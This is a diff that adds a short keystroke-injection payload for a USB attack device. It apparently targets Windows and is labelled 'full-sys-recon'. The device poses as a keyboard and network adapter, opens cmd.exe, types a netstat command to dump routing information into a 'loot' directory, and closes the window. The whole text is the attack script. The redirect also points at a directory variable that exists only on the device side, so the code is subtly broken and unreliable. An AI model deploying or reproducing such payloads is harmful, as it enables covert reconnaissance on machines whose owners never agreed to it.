@@ -1,0 +1,15 @@
+#setup
+LED SETUP
+ATTACKMODE RNDIS_ETHERNET HID STORAGE
+mkdir -p /root/udisk/loot/full-sys-recon
+lootdir=/root/udisk/loot/full-sys-recon
+#payload
+LED STAGE1
+RUN WIN cmd.exe
+Q DELAY 5000
+Q STRING netstat -rn > $lootdir
+Q DELAY 5000
+Q ENTER
+Q DELAY 5000
+Q ALT F4
+LED FINISH
